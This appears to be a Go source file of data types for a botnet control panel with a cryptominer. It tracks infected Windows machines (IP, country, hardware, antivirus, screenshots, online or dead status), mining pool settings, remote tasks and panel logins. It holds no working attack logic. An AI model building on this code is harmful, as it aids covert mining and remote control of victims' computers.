package main

type ISOCode string
type OPName string
type BITName string
type GPUName string
type CPUName string
type LineName string

type LineCnt int
type CPUCnt int
type GPUCnt int
type OPCnt int
type ISOCnt int
type BitCnt int

type WinSystemInfo struct {
	IP         string `json:"ip"`
	Nation     string `json:"nation"`
	CPU        string `json:"cpu"`
	GPU        string `json:"gpu"`
	Antivirus  string `json:"antivirus"`
	OS         string `json:"os"`
	PCName     string `json:"pcname"`
	Firstcon   string `json:"firstcon"`
	Lastcon    string `json:"lastcon"`
	Status     string `json:"status"`
	Screenshot string `json:"screenshot"`
}

type Config struct {
	Pool        string
	Address     string
	Password    string
	Threads     int
	IdleTime    int
	IdleThreads int
	Ssl         int
}

type Task struct {
	Tid          string `json:"tid"`
	Command      string `json:"command"`
	Parameter    string `json:"parameter"`
	FilterMethod string `json:"filtermethod"`
	Filter       string `json:"filter"`
	WantedExec   int    `json:"wanted_executions"`
	CurrentExec  int    `json:"current_executions"`
	Created      int    `json:"created"`
	Date         int    `json:"date"`
	Status       string `json:"status"`
	PCName       string `json:"pcname"`
}

type BotCount struct {
	Count int `json:"total"`
}

type GEO struct {
	Geo string `json:"nation"`
	Cnt int    `json:"cnt"`
}

type OP struct {
	OS  string `json:"os"`
	Cnt int    `json:"cnt"`
}

type GPU struct {
	Gpu string `json:"gpu"`
	Cnt int    `json:"cnt"`
}

type CPU struct {
	Cpu string `json:"cpu"`
	Cnt int    `json:"cnt"`
}

type Line struct {
	Day string `json:"day"`
	Cnt int    `json:"cnt"`
}

type BotCnt struct {
	Online  int `json:"online"`
	Offline int `json:"offline"`
	Dead    int `json:"dead"`
}
type BotIntCnt int

type Action struct {
	Taskid string
	Action string
}

type UserInfo struct {
	Username string `json:"username"`
	Password string `json:"password"`
}
